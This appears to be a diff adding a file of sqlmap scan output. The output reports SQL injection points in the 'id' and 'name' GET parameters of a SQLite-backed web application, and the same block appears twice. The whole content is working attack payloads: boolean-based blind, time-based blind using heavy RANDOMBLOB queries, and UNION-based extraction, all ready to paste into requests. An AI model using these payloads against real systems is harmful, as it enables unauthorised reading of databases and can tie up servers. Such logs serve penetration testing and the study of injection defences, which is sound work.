@@ -1,0 +1,50 @@
+sqlmap identified the following injection point(s) with a total of 164 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5923=5923-- XZLv&name=widget
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: id=1 AND 2999=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- BGGD&name=widget
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1 UNION ALL SELECT NULL,CHAR(113,113,118,107,113)||CHAR(72,118,114,104,100,71,111,100,111,117,97,116,106,110,115,109,114,101,77,82,99,110,76,106,83,78,118,106,107,112,109,77,116,100,81,88,113,77,108,67)||CHAR(113,106,98,112,113)-- yrDA&name=widget
+
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: SQLite OR boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: id=1&name=-9449' OR CASE WHEN 7150=7150 THEN 7150 ELSE JSON(CHAR(118,101,65,119)) END-- dQCu
+
+    Type: time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: id=1&name=widget' OR 3489=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- puDB
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5923=5923-- XZLv&name=widget
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: id=1 AND 2999=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- BGGD&name=widget
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1 UNION ALL SELECT NULL,CHAR(113,113,118,107,113)||CHAR(72,118,114,104,100,71,111,100,111,117,97,116,106,110,115,109,114,101,77,82,99,110,76,106,83,78,118,106,107,112,109,77,116,100,81,88,113,77,108,67)||CHAR(113,106,98,112,113)-- yrDA&name=widget
+
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: SQLite OR boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: id=1&name=-9449' OR CASE WHEN 7150=7150 THEN 7150 ELSE JSON(CHAR(118,101,65,119)) END-- dQCu
+
+    Type: time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: id=1&name=widget' OR 3489=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- puDB
+---
+back-end DBMS: SQLite
